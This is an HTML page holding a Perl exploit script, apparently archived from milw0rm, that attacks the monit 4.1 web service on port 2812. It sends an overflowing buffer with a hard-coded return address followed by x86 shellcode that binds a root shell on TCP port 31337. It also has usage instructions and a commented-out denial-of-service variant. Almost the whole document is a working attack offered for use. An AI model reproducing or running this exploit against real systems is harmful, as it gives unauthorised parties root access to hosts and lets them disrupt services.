<html><head><title>Monit <= 4.1 Remote Root Buffer Overflow Exploit
</title></head><pre>#!/usr/bin/perl
#
# monit &lt;= 4.1 remote root exploit
# coded by gsicht (09.04.04)
#

use IO::Socket::INET;
$socket = 0;

my $shellcode = # 8 + 88 = 96 bytes portbind 31337
&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot; .
&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot; .
&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot; .
&quot;\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80&quot; .
&quot;\x89\xc7\x52\x66\x68&quot; .
&quot;\x7a\x69&quot; . # port 31337/tcp, change if needed
&quot;\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80&quot; .
&quot;\xb0\x66\xb3\x04\xcd\x80&quot; .
&quot;\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80&quot; .
&quot;\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80&quot; .
&quot;\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;


print &quot;\nmonit 4.1 dos exploit\n&quot;;
print &quot;coded by gsicht\n\n&quot;;

if(@ARGV&lt;1)
{
print &quot;Usage: perl agate.pl &lt;target&gt;\n\n&quot;;
exit(0);
}

print &quot;HOST:\t$ARGV[0]\n&quot;;
print &quot;PORT:\t2812\n&quot;;


my $buffer = &quot;B&quot; x 284 . &quot;\xcf\x89\xb3\x40&quot; . $shellcode; # esp mandrake 9.1
#my $buffer = &quot;A&quot; x 284 . &quot;XXXX&quot; . &quot;B&quot; x 100; #dos and debug

print &quot;connecting to server...\n&quot;;

$socket = IO::Socket::INET -&gt; new( PeerAddr =&gt; $ARGV[0],
    PeerPort =&gt; 2812,
    Proto    =&gt; &quot;tcp&quot;);
if(!defined($socket))
{
print &quot;could not connect :-P\n&quot;;
sleep(1);
exit(0);
}

print &quot;connected\n&quot;;
sleep(1);
print &quot;sending string\n&quot;;
print $socket $buffer;

close $socket;
print &quot;\ndosed!\n&quot;;

# milw0rm.com [2004-04-09]</pre></html>